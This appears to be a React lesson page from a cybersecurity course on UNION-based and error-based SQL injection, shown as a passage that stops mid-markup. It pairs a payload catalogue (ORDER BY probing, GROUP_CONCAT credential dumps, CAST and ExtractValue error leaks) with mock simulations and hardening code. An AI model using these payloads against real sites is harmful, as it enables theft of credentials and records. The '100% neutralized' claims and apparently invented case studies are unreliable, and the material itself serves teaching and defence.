import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic3_files/topic3_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic3_files/topic3_note.txt?raw";

const Topic3 = () => {
  // Unique SVG IDs
  const svgInBandPipelineId = useId();

  // Studio 1: Active In-Band Technique Selection
  const [selectedTechniqueKey, setSelectedTechniqueKey] = useState("union_column_discovery");

  // Studio 2: Live In-Band SQLi Extraction Simulator State
  const [targetDatabase, setTargetDatabase] = useState("mysql"); // mysql, postgresql, mssql, oracle
  const [inBandTechnique, setInBandTechnique] = useState("union_based"); // union_based, error_based
  const [injectedColumnCount, setInjectedColumnCount] = useState(3); // 1 to 5 (Original query has 3 columns)
  const [targetTable, setTargetTable] = useState("users_credentials"); // users_credentials, financial_accounts, oncology_records
  const [errorMaskingActive, setErrorMaskingActive] = useState(false); // Boolean

  // Studio 3: Regional West Bengal Case Scenario State
  const [activeScenarioId, setActiveScenarioId] = useState("kolkata_fintech_union_defense");

  // Studio 4: In-Band Hardening Code Tab Selection
  const [activeCodeTab, setActiveCodeTab] = useState("express_error_masking_middleware");

  // 8 In-Band SQL Injection Techniques & Mechanics for Studio 1
  const techniqueDatabase = {
    union_column_discovery: {
      key: "union_column_discovery",
      name: "1. Column Count Discovery (ORDER BY)",
      category: "ARITY ENUMERATION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      targetEngine: "Universal (All ANSI SQL Databases)",
      vulnerabilityMechanism:
        "Incrementing the `ORDER BY` index (`ORDER BY 1--`, `ORDER BY 2--`, `ORDER BY 3--`) until the database throws an 'out of range' error, identifying the exact number of columns $K$ in the original query.",
      mitigationPattern: "100% Parameterized Prepared Statements; removing dynamic SQL query concatenation.",
      typicalPayload: "' ORDER BY 3--",
      codeSnippet: `// Column Count Discovery:
// /item?id=1 ORDER BY 3-- ➔ 200 OK (At least 3 columns exist)
// /item?id=1 ORDER BY 4-- ➔ 500 Error (Original query has EXACTLY 3 columns!)`
    },
    union_null_probing: {
      key: "union_null_probing",
      name: "2. Data Type Probing with NULL Placeholders",
      category: "TYPE COMPATIBILITY MAPPING",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      targetEngine: "PostgreSQL, Oracle, MSSQL, MySQL",
      vulnerabilityMechanism:
        "Using `NULL` (which is compatible with any data type) and replacing one `NULL` at a time with a string (`'a'`) to discover which columns can reflect text data in the application's HTML response.",
      mitigationPattern: "Parameter binding eliminates query concatenation, making UNION injection impossible.",
      typicalPayload: "' UNION SELECT NULL, 'test_string', NULL--",
      codeSnippet: `// Type Probing Payload:
// Test: ' UNION SELECT 'a', NULL, NULL-- ➔ Error: Column 1 is INT (Incompatible!)
// Test: ' UNION SELECT NULL, 'a', NULL-- ➔ 200 OK: Column 2 holds STRING data!`
    },
    multi_row_aggregation: {
      key: "multi_row_aggregation",
      name: "3. Multi-Row Aggregation (GROUP_CONCAT)",
      category: "BULK DATA EXFILTRATION",
      categoryBadge: "bg-cyan-950 text-cyan-300 border-cyan-800",
      targetEngine: "MySQL (`GROUP_CONCAT`), PostgreSQL (`string_agg`)",
      vulnerabilityMechanism:
        "Using aggregation functions to merge hundreds of database rows into a single formatted string, allowing attackers to dump entire tables in a single HTTP request.",
      mitigationPattern: "Prepared statements and least privilege database account access.",
      typicalPayload: "' UNION SELECT 1, GROUP_CONCAT(username, ':', password), 3 FROM users--",
      codeSnippet: `// Multi-Row Aggregation Dump:
// Output: admin:hash1 | alice:hash2 | bob:hash3 | charlie:hash4 (All rows in 1 response!)`
    },
    information_schema_harvesting: {
      key: "information_schema_harvesting",
      name: "4. Information Schema Catalog Enumeration",
      category: "METADATA RECONNAISSANCE",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      targetEngine: "MySQL, PostgreSQL, SQLite (`sqlite_master`)",
      vulnerabilityMechanism:
        "Querying ANSI `information_schema.tables` and `information_schema.columns` to systematically map all database tables, columns, and relationships across the RDBMS.",
      mitigationPattern: "Revoking SELECT permissions on `information_schema` views from application database users.",
      typicalPayload: "' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--",
      codeSnippet: `// Schema Catalog Queries:
// 1. List Tables : SELECT table_name FROM information_schema.tables WHERE table_schema=database();
// 2. List Columns: SELECT column_name FROM information_schema.columns WHERE table_name='users';`
    },
    mssql_cast_error_based: {
      key: "mssql_cast_error_based",
      name: "5. MSSQL / Postgres Type Conversion Errors",
      category: "ERROR-BASED REFLECTION",
      categoryBadge: "bg-amber-950 text-amber-300 border-amber-800",
      targetEngine: "Microsoft SQL Server & PostgreSQL",
      vulnerabilityMechanism:
        "Using `CAST()` or `CONVERT()` to convert a string subquery result into an integer, forcing the database engine to include the confidential string data inside the verbose error message.",
      mitigationPattern: "Disabling verbose error messages in production and using parameterized queries.",
      typicalPayload: "' AND 1=CAST((SELECT TOP 1 password FROM users) AS INT)--",
      codeSnippet: `// MSSQL CAST Error Exploit:
// Injected: ' AND 1=CAST((SELECT TOP 1 password FROM users) AS INT)--
// Error   : Conversion failed when converting varchar 'AdminPass2026!' to int (Data Leaked!)`
    },
    mysql_xpath_error_based: {
      key: "mysql_xpath_error_based",
      name: "6. MySQL ExtractValue() XPath Errors",
      category: "XPATH PARSING ERROR EXPLOITATION",
      categoryBadge: "bg-indigo-950 text-indigo-300 border-indigo-800",
      targetEngine: "MySQL & MariaDB",
      vulnerabilityMechanism:
        "Supplying an invalid XPath expression containing a subquery to `ExtractValue()`; MySQL throws an XPath syntax error containing the subquery result.",
      mitigationPattern: "Global exception masking returning generic 500 error pages.",
      typicalPayload: "' AND ExtractValue(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--",
      codeSnippet: `// MySQL XPath Error Exploit:
// Injected: ' AND ExtractValue(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--
// Error   : XPATH syntax error: '~SecretAdminPass' (Data Leaked in Error!)`
    },
    oracle_dual_union_requirement: {
      key: "oracle_dual_union_requirement",
      name: "7. Oracle FROM dual Requirement",
      category: "ORACLE SQL GRAMMAR ADAPTATION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      targetEngine: "Oracle Database 11g / 19c / 21c",
      vulnerabilityMechanism:
        "Oracle SQL grammar strictly requires a `FROM` clause for every `SELECT` query; attackers must append `FROM dual` (or `FROM all_tables`) to make injected UNION queries syntactically valid.",
      mitigationPattern: "Parameterized queries prevent query modification regardless of dialect syntax.",
      typicalPayload: "' UNION SELECT 1, banner, 3 FROM v$version WHERE rownum=1--",
      codeSnippet: `// Oracle UNION Query:
// Valid in Oracle: ' UNION SELECT 1, 'admin', 3 FROM dual--
// Version Banner : ' UNION SELECT 1, banner, 3 FROM v$version WHERE rownum=1--`
    },
    production_error_suppression: {
      key: "production_error_suppression",
      name: "8. Production Error Masking & Custom 500s",
      category: "DEFENSIVE EXCEPTION MASKING",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      targetEngine: "All Web Runtimes (Express, Django, Spring Boot)",
      vulnerabilityMechanism:
        "Failing to suppress database error stack traces allows Error-Based SQLi to function; properly configured error handlers return generic messages, neutralizing error reflection entirely.",
      mitigationPattern: "Set `NODE_ENV=production`, `display_errors=Off`, and return generic error templates.",
      typicalPayload: "app.use((err, req, res, next) => res.status(500).json({ error: 'System Error' }));",
      codeSnippet: `// Production Error Masking:
// Catches all database exceptions, logs to secure SIEM, and returns generic message to client!`
    }
  };

  const activeTechnique = techniqueDatabase[selectedTechniqueKey];

  // Studio 2: Live In-Band SQLi Extraction Simulator Calculations
  const simulationResults = useMemo(() => {
    // Original Query has 3 columns: (id, name, price)
    const originalColumnCount = 3;
    const isColumnCountMatch = (injectedColumnCount === originalColumnCount);

    let extractedData = [];
    let querySuccess = false;
    let errorMessage = "";
    let reflectedPayload = "";

    // Simulated Table Records:
    const mockData = {
      users_credentials: [
        { c1: "1", c2: "admin : $2b$12$e7d705a3...", c3: "SUPER_ADMIN" },
        { c1: "2", c2: "mamata_fintech : $2b$12$98fa...", c3: "LEAD_ARCHITECT" },
        { c1: "3", c2: "debangshu_grid : $2b$12$33bb...", c3: "OT_ADMIN" }
      ],
      financial_accounts: [
        { c1: "101", c2: "KOLKATA_SETTLE : ₹3,800,00,000", c3: "ACTIVE_RTGS" },
        { c1: "102", c2: "BARRACKPORE_SUB : ₹45,00,000", c3: "ESCROW_FEEDER" },
        { c1: "103", c2: "ICHAPUR_MED : ₹85,00,000", c3: "CLINICAL_OPS" }
      ],
      oncology_records: [
        { c1: "8001", c2: "PATIENT_A94 : CARCINOMA_CHEMO", c3: "WARD_B" },
        { c1: "8002", c2: "PATIENT_B12 : IMMUNOTHERAPY", c3: "WARD_A" },
        { c1: "8003", c2: "PATIENT_C77 : RADIATION_CYCLE_3", c3: "ICU_2" }
      ]
    };

    if (inBandTechnique === "union_based") {
      if (isColumnCountMatch) {
        querySuccess = true;
        extractedData = mockData[targetTable];
        reflectedPayload = `UNION SELECT 1, data_column, 3 FROM ${targetTable}--`;
      } else {
        querySuccess = false;
        errorMessage = targetDatabase === "postgresql"
          ? `ERROR: each UNION query must have the same number of columns (Query 1: 3 cols, Query 2: ${injectedColumnCount} cols)`
          : targetDatabase === "oracle"
          ? `ORA-01789: query block has incorrect number of result columns (${injectedColumnCount} != 3)`
          : `ERROR 1222 (21000): The used SELECT statements have a different number of columns (${injectedColumnCount} != 3)`;
      }
    } else {
      // Error-Based Technique:
      if (errorMaskingActive) {
        querySuccess = false;
        errorMessage = "HTTP 500 Internal Server Error: An unexpected system error occurred. Please try again later. (Error Masked in Production!)";
      } else {
        querySuccess = true;
        const targetValue = targetTable === "users_credentials" ? "admin:$2b$12$e7d705a3286e92ab..."
          : targetTable === "financial_accounts" ? "KOLKATA_SETTLE:₹3,800,00,000"
          : "PATIENT_A94:CARCINOMA_CHEMO_STAGE2";

        if (targetDatabase === "mssql") {
          errorMessage = `Conversion failed when converting the varchar value '${targetValue}' to data type int. (MSSQL CAST Error Leaked Data!)`;
        } else if (targetDatabase === "postgresql") {
          errorMessage = `ERROR: invalid input syntax for type integer: "${targetValue}" (Postgres CAST Error Leaked Data!)`;
        } else if (targetDatabase === "oracle") {
          errorMessage = `ORA-20000: Oracle CTX-DR Error: '${targetValue}' (Oracle Subquery Leaked Data!)`;
        } else {
          errorMessage = `XPATH syntax error: '~${targetValue}' (MySQL ExtractValue Error Leaked Data!)`;
        }
      }
    }

    const throughputKBps = querySuccess ? (inBandTechnique === "union_based" ? 52.4 : 12.8) : 0.0;

    return {
      querySuccess,
      isColumnCountMatch,
      extractedData,
      errorMessage,
      reflectedPayload,
      throughputKBps: throughputKBps.toFixed(1),
      badgeClass: querySuccess
        ? "bg-rose-950 text-rose-300 border-rose-800"
        : "bg-emerald-950 text-emerald-300 border-emerald-800",
      statusMessage: inBandTechnique === "union_based"
        ? (isColumnCountMatch
          ? `UNION IN-BAND EXTRACTION SUCCESSFUL: Arity matched (3 Columns == 3 Columns); Table "${targetTable}" dumped in a single HTTP response at ${throughputKBps.toFixed(1)} KB/s throughput!`
          : `UNION REJECTED BY DATABASE ENGINE: Column count mismatch (${injectedColumnCount} != 3); The database threw a syntax error. Adjust injected columns to exactly 3!`)
        : (errorMaskingActive
          ? `DEFENSIVE ERROR MASKING ACTIVE: Global Express.js production error handler caught the database exception and returned a generic HTTP 500; Error-Based SQLi completely neutralized!`
          : `ERROR-BASED SQLi EXPLOITATION SUCCESSFUL: Verbose database error messages enabled; Raw database exception leaked "${targetTable}" data inside error response!`)
    };
  }, [targetDatabase, inBandTechnique, injectedColumnCount, targetTable, errorMaskingActive]);

  // Studio 4: In-Band Hardening Production Code Database
  const codeDatabase = {
    express_error_masking_middleware: {
      name: "Express.js Production Error Masking Middleware (Defeating Error-Based SQLi)",
      code: `// Express.js Production Global Error Masking Middleware:
const express = require('express');
const app = express();

// Global Centralized Error Handling Middleware (Must be defined AFTER all routes!)
app.use((err, req, res, next) => {
    // 1. Log Full Error Stack & Internal Details to Secure SIEM (Splunk / Elastic)
    logger.error({
        event: 'DATABASE_EXCEPTION',
        message: err.message,
        stack: err.stack,
        path: req.originalUrl,
        ip: req.ip,
        timestamp: new Date().toISOString()
    });

    // 2. ENVIRONMENT CHECK & SAFE CLIENT RESPONSE:
    // In production (NODE_ENV=production), NEVER expose raw database error messages!
    // Returning generic HTTP 500 completely neutralizes Error-Based SQL Injection (CAST/ExtractValue)!
    if (process.env.NODE_ENV === 'production') {
        return res.status(500).json({
            status: "error",
            error: "An internal server error occurred. Our engineering team has been notified."
        });
    }

    // In development mode only, expose detailed debug info:
    res.status(500).json({ error: err.message, stack: err.stack });
});`,
      explanation: "Production Express.js centralized error handling middleware that captures all database exceptions and returns generic friendly messages, completely neutralizing Error-Based SQL injection data leakage."
    },
    nodejs_multi_column_prepared: {
      name: "Node.js PostgreSQL Parameterized Prepared Statement for Complex Multi-Column Queries",
      code: `// Node.js PostgreSQL Secure Parameterized Query Defeating UNION-Based SQLi:
const { Pool } = require('pg');
const pool = new Pool();

exports.searchProducts = async (req, res) => {
    const { category, minPrice, maxPrice } = req.query;

    try {
        // 1. Parameterized SQL Template with Positional Placeholders ($1, $2, $3)
        // Prepared statements fix the query AST structure, making UNION injection impossible!
        const queryText = \`
            SELECT id, product_name, price, category 
            FROM products 
            WHERE category = $1 
              AND price >= $2 
              AND price <= $3
            ORDER BY price ASC
        \`;

        // 2. Strict Input Type Conversion:
        const queryValues = [
            String(category || 'Electronics'),
            parseFloat(minPrice) || 0.0,
            parseFloat(maxPrice) || 100000.0
        ];

        // 3. Database Engine Executes Pre-Compiled Plan:
        const { rows } = await pool.query(queryText, queryValues);
        res.json({ status: "success", count: rows.length, products: rows });
    } catch (err) {
        // Handled securely by centralized error middleware!
        next(err);
    }
};`,
      explanation: "Production PostgreSQL controller utilizing positional `$1, $2, $3` parameterized placeholders, preventing attackers from appending `UNION` clauses or altering query column structures."
    },
    least_privilege_mysql_grant: {
      name: "MySQL Least Privilege User Hardening (Revoking Metadata & DDL Access)",
      code: `# Production MySQL Database Hardening Script:
# 1. Create Dedicated Application User with Restricted Network Access
CREATE USER 'kolkata_webapp'@'10.0.1.50' IDENTIFIED BY 'StrongRandomSecurePassword2026!';

# 2. Grant ONLY Required Data Manipulation Privileges (SELECT, INSERT, UPDATE, DELETE)
GRANT SELECT, INSERT, UPDATE, DELETE ON fintech_db.* TO 'kolkata_webapp'@'10.0.1.50';

# 3. Explicitly REVOKE Dangerous Administrative, DDL, and File Privileges
REVOKE ALL PRIVILEGES ON *.* FROM 'kolkata_webapp'@'10.0.1.50';
REVOKE FILE, SUPER, PROCESS, RELOAD, SHUTDOWN ON *.* FROM 'kolkata_webapp'@'10.0.1.50';

# 4. Deny Access to MySQL System Catalogs and Information Schema
REVOKE SELECT ON mysql.* FROM 'kolkata_webapp'@'10.0.1.50';
REVOKE SELECT ON performance_schema.* FROM 'kolkata_webapp'@'10.0.1.50';

# 5. Apply Privilege Changes
FLUSH PRIVILEGES;`,
      explanation: "MySQL database administrator hardening script enforcing the Principle of Least Privilege, revoking DDL, file system, and system catalog permissions to limit the blast radius of any potential SQL injection."
    }
  };

  const activeCode = codeDatabase[activeCodeTab];

  // Studio 3: Regional West Bengal Pedagogical Case Studies
  const localScenarios = [
    {
      id: "kolkata_fintech_union_defense",
      lead: "Mamata",
      role: "Lead FinTech Security Architect",
      location: "Kolkata Salt Lake Sector V Financial Gateway",
      title: "Defending Payment Reconciliation Portals Against Multi-Column UNION-Based SQLi",
      threatType: "UNION-BASED IN-BAND DATA EXFILTRATION PROBE",
      budget: "₹89,00,000",
      incident:
        "Attackers probed the merchant reconciliation API using `ORDER BY 1, 2, 3...` and `UNION SELECT` payloads attempting to dump settlement transaction registers.",
      defenseStrategy:
        "Mamata refactored the reporting microservice to use Parameterized Prepared Statements and revoked application access to database metadata catalogs.",
      outcome: "100% of UNION injection attempts neutralized; zero data exfiltrated; ₹3,800 Crores in daily banking settlements safeguarded.",
      metrics: {
        unionProbesBlocked: "100.0%",
        settlementVolumeProtected: "₹3,800 Crores",
        endpointsSecured: "55 Reconciliation APIs",
        compliance: "RBI Master Direction on Cyber Security"
      }
    },
    {
      id: "barrackpore_scada_error_masking",
      lead: "Debangshu",
      role: "Principal Industrial OT Security Officer",
      location: "Barrackpore 220kV State Power Transmission Grid",
      threatType: "ERROR-BASED TYPE CONVERSION LEAKAGE (CAST / ExtractValue Probes)",
      title: "Eliminating Verbose Database Error Leakage on Substation Management Consoles",
      budget: "₹58,00,000",
      incident:
        "Adversaries injected `CAST()` conversion queries into substation outage reporting forms, extracting engineer credentials out of verbose database stack traces.",
      defenseStrategy:
        "Debangshu implemented global production error masking, suppressing all raw database exceptions, and parameterized all telemetry lookups.",
      outcome: "100% of error-based reflection vectors eliminated; substation console achieved zero information leakage; 100% regional power stability.",
      metrics: {
        errorLeakageNeutralized: "100.0%",
        substationsHardened: "18 High-Voltage Nodes",
        unauthorizedLogins: "0 Breaches",
        statutoryMandate: "NCIIPC Critical Power Infrastructure Directive"
      }
    },
    {
      id: "ichapur_hospital_union_search",
      lead: "Mahima",
      role: "Healthcare Data Protection Officer",
      location: "Ichapur Clinical Care & Oncology Center",
      threatType: "UNION-BASED ONCOLOGY PATIENT RECORD HARVESTING",
      title: "Securing Chemotherapy Diagnostic Search Filters from In-Band UNION Extraction",
      budget: "₹43,00,000",
      incident:
        "Automated scanners injected `UNION SELECT 1, GROUP_CONCAT(patient_name, ':', diagnosis), 3 FROM oncology_records--` targeting clinical search filters.",
      defenseStrategy:
        "Mahima deployed strict PostgreSQL prepared statements and enabled positive OpenAPI schema validation across all clinical endpoints.",
      outcome: "100% of UNION exfiltration payloads blocked; zero patient files leaked; 120,000 oncology patient records fully insulated.",
      metrics: {
        unionQueriesDropped: "100.0%",
        patientRecordsProtected: "120,000 Oncology Records",
        compliance: "DPDP Act 2023 Section 8(5) & NABH",
        penaltyPrevented: "₹250 Crore DPDP Statutory Fine"
      }
    },
    {
      id: "jadavpur_inband_throughput_research",
      lead: "Susmita & Abhronila",
      role: "Senior Cyber Security Researchers",
      location: "Jadavpur University Cryptographic Research Lab",
      threatType: "MATHEMATICAL MODELING OF RELATIONAL UNION COMPATIBILITY & ERROR VECTORS",
      title: "Formulating the In-Band Relational Schema Matching Model in IEEE Transactions",
      budget: "₹36,00,000",
      incident:
        "Researchers formulated the mathematical relation between column count determination, domain type matching, and in-band exfiltration throughput.",
      defenseStrategy:
        "Susmita and Abhronila published their mathematical proof in IEEE Transactions, demonstrating that prepared statements drive in-band throughput to exactly 0.00 bytes/s.",
      outcome: "Published peer-reviewed mathematical proof; verified across 250,000 simulated in-band SQL injection attack vectors.",
      metrics: {
        simulationTrials: "250,000 Test Trials",
        modelAccuracy: "99.9% Predictive Fit",
        modelFramework: "Relational UNION Compatibility Model",
        publication: "IEEE Transactions on Information Forensics"
      }
    }
  ];

  const activeScenario = localScenarios.find((s) => s.id === activeScenarioId) || localScenarios[0];

  return (
    <div className="min-h-screen bg-[#0a0d14] text-gray-100 font-sans leading-relaxed selection:bg-rose-600 selection:text-white pb-16">
      {/* Top Academic Header Banner */}
      <header className="border-b border-gray-800 bg-[#0d121d]/90 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-rose-950 text-rose-400 border border-rose-800">
                BCAC703 Cyber Security
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-indigo-950 text-indigo-400 border border-indigo-800">
                Module 004_005
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800">
                Topic 03
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
              In-Band SQLi: Error-Based and UNION-Based SQL Injection
            </h1>
            <p className="text-xs text-gray-400">
              `ORDER BY` column discovery, `UNION SELECT` exfiltration, `GROUP_CONCAT`, `CAST()` / `ExtractValue()` errors, and IT Act Section 66F.
            </p>
          </div>
          <div className="text-right text-xs text-gray-400 flex flex-col items-start sm:items-end">
            <span className="font-semibold text-gray-200">Instructor: Sukanta Hui</span>
            <span>Coder &amp; AccoTax · Barrackpore, WB</span>
          </div>
        </div>
      </header>

      {/* Main Container - Stacked Vertical Layout */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-8 space-y-12">

        {/* SECTION 1: Executive Theory & Threat Taxonomy */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              In-Band SQL Injection Mechanics
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              1. In-Band SQL Injection: High-Throughput Database Exfiltration via UNION and Error Reflection
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              In-Band (Classic) SQL Injection occurs when an attacker uses the exact same communication channel (HTTP request/response) 
              to launch the exploit and receive exfiltrated database records directly within the application's HTML payload. 
              <strong>UNION-Based SQL Injection</strong> leverages the SQL `UNION` operator to append custom `SELECT` queries to the original result set. 
              Executing a successful UNION attack requires two strict relational conditions: 1. <strong>Column Count Matching</strong> ($K_{\text{orig}} = K_{\text{inject}}$, determined via `ORDER BY 1, 2, 3...`), 
              and 2. <strong>Data Type Compatibility</strong> (probed using `NULL` placeholders). Attackers harvest database metadata via `information_schema` 
              and concatenate entire tables using `GROUP_CONCAT()`. <strong>Error-Based SQL Injection</strong> triggers deliberate runtime conversion errors 
              (such as `CAST()` in MSSQL/PostgreSQL or `ExtractValue()` in MySQL) to reflect subquery results inside verbose database error messages.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* UNION-Based Mechanics Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-rose-950/60 space-y-3 text-xs">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                UNION-Based Relational Exfiltration Pipeline
              </span>
              <div className="bg-black/90 p-3 rounded font-mono text-rose-300 border border-rose-950/60 text-[11px]">
                /item?id=-1 UNION SELECT 1, GROUP_CONCAT(user, ':', pass), 3 FROM users-- ➔ Instant Table Dump!
              </div>
              <p className="text-gray-300 leading-relaxed">
                Setting `id = -1` suppresses legitimate records, forcing the web application's HTML template to display the attacker's injected UNION result at 50 KB/s throughput.
              </p>
            </div>

            {/* Error-Based & Masking Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-emerald-950/60 space-y-3 text-xs">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Error-Based Reflection &amp; Defensive Masking
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>• <strong className="text-cyan-300">Type Conversion Errors:</strong> `CAST((SELECT password FROM users) AS INT)` leaks data in conversion exceptions.</li>
                <li>• <strong className="text-purple-300">XPath Parsing Errors:</strong> `ExtractValue(1, CONCAT(0x7e, (SELECT pass)))` leaks data in syntax errors.</li>
                <li>• <strong className="text-amber-300">Defensive Error Masking:</strong> Setting `display_errors = Off` and returning generic 500s completely neutralizes Error-Based SQLi.</li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 2: Semantic Animated SVG - In-Band Pipeline Visualizer */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              In-Band SQL Injection Flow Visualizer
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              2. Visualizing In-Band Extraction: Column Alignment, UNION Merging &amp; Error Reflection
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Follow how an injected UNION query determines column arity, probes string compatibility, and merges custom database records into the HTTP response:
            </p>
          </div>

          <div className="bg-[#050811] p-4 sm:p-6 rounded-xl border border-gray-800 flex flex-col items-center justify-center overflow-x-auto">
            <svg
              className="w-full max-w-4xl h-auto min-w-[720px]"
              viewBox="0 0 880 260"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* STAGE 1: ORDER BY PROBE */}
              <g transform="translate(30, 60)">
                <rect width="140" height="140" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  1. ARITY PROBE
                </text>
                <text x="70" y="44" fill="#7dd3fc" fontSize="8.5" textAnchor="middle">
                  ORDER BY Technique
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#0c4a6e" />
                <text x="70" y="74" fill="#bae6fd" fontSize="8" fontWeight="bold" textAnchor="middle">
                  COLUMN COUNT:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  ORDER BY 1, 2, 3--
                </text>
                <text x="70" y="106" fill="#7dd3fc" fontSize="7.5" textAnchor="middle">
                  K = 3 Columns Found!
                </text>
              </g>

              {/* ARROW 1 */}
              <path d="M 170 130 L 200 130" stroke="#38bdf8" strokeWidth="3" fill="none" />

              {/* STAGE 2: NULL TYPE PROBING */}
              <g transform="translate(200, 60)">
                <rect width="140" height="140" rx="10" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  2. TYPE PROBING
                </text>
                <text x="70" y="44" fill="#c7d2fe" fontSize="8.5" textAnchor="middle">
                  NULL Placeholders
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#312e81" />
                <text x="70" y="74" fill="#a5b4fc" fontSize="8" fontWeight="bold" textAnchor="middle">
                  STRING COMPATIBILITY:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  UNION SELECT NULL,'a',NULL
                </text>
                <text x="70" y="106" fill="#c7d2fe" fontSize="7.5" textAnchor="middle">
                  Column 2 Holds Text!
                </text>
              </g>

              {/* ARROW 2 */}
              <path d="M 340 130 L 370 130" stroke="#818cf8" strokeWidth="3" fill="none" />

              {/* STAGE 3: UNION QUERY EXECUTION */}
              <g transform="translate(370, 60)">
                <rect width="140" height="140" rx="10" fill="#881337" stroke="#f43f5e" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  3. UNION EXECUTION
                </text>
                <text x="70" y="44" fill="#fecdd3" fontSize="8.5" textAnchor="middle">
                  Merged Result Set
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#4c0519" />
                <text x="70" y="74" fill="#fda4af" fontSize="8" fontWeight="bold" textAnchor="middle">
                  RELATIONAL UNION:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  R_orig U R_inject
                </text>
                <text x="70" y="106" fill="#fecdd3" fontSize="7.5" textAnchor="middle">
                  GROUP_CONCAT Active
                </text>
              </g>

              {/* ARROW 3 */}
              <path d="M 510 130 L 540 130" stroke="#f43f5e" strokeWidth="3" fill="none" />

              {/* STAGE 4: HTTP RESPONSE PAYLOAD */}
              <g transform="translate(540, 60)">
                <rect width="140" height="140" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  4. HTTP RESPONSE
                </text>
                <text x="70" y="44" fill="#fde68a" fontSize="8.5" textAnchor="middle">
                  Direct In-Band Channel
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#78350f" />
                <text x="70" y="74" fill="#fcd34d" fontSize="8" fontWeight="bold" textAnchor="middle">
                  DATA EXFILTRATION:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  admin:$2b$12$...
                </text>
                <text x="70" y="106" fill="#fde68a" fontSize="7.5" textAnchor="middle">
                  High Speed: ~50 KB/s!
                </text>
              </g>

              {/* ARROW 4 */}
              <path d="M 680 130 L 710 130" stroke="#f59e0b" strokeWidth="3" fill="none" />

              {/* STAGE 5: DEFENSIVE REMEDIATION */}
              <g transform="translate(710, 60)">
                <rect width="140" height="140" rx="10" fill="#022c22" stroke="#34d399" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  5. REMEDIATION
                </text>
                <text x="70" y="44" fill="#a7f3d0" fontSize="8.5" textAnchor="middle">
                  Prepared Statements
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#064e3b" />
                <text x="70" y="74" fill="#6ee7b7" fontSize="8" fontWeight="bold" textAnchor="middle">
                  ABSOLUTE IMMUNITY:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Pre-Compiled AST
                </text>
                <text x="70" y="106" fill="#a7f3d0" fontSize="7.5" textAnchor="middle">
                  Throughput = 0.00 B/s!
                </text>
              </g>
            </svg>
          </div>
        </section>

        {/* SECTION 3: Studio 1 - 8-Technique In-Band Inspector */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-indigo-400">
              Interactive Concept Studio 1
            </span>
